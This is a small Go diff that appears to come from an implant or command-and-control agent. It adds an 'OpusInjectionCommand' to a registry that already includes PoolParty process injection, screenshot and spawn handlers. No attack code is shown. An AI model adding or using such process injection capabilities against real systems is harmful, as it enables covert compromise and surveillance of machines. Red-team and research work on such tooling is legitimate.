@@ -51,6 +51,7 @@ func Initialize() {
 		RegisterCommand(&PoolPartyInjectionCommand{})
 		RegisterCommand(&ScreenshotCommand{})
 		RegisterCommand(&SpawnCommand{})
+		RegisterCommand(&OpusInjectionCommand{})
 	}
 
 	log.Printf("[INFO] Registered %d command handlers", len(commandRegistry))
